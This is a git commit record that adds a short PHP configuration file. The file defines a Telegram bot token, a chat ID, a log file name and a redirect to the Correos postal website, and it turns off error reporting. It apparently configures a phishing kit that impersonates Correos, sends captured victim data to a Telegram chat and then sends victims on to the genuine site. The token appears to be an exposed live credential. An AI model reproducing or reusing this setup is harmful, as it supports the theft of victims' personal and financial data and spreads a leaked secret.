5b0576e291aedd601b557a861d502fecb193d4e4
zenderder <114303168+zenderder@users.noreply.github.com>
2022-11-23 14:54:54 +0100

    delete

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5544847494:AAEnhyodvVER8Tj09GJdirYv8pqdLEoNpwQ");
+define("TELEGRAM_CHAT_ID", "-819179036");
+define("TELEGRAM_CHAT_IDD", "-819179036");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
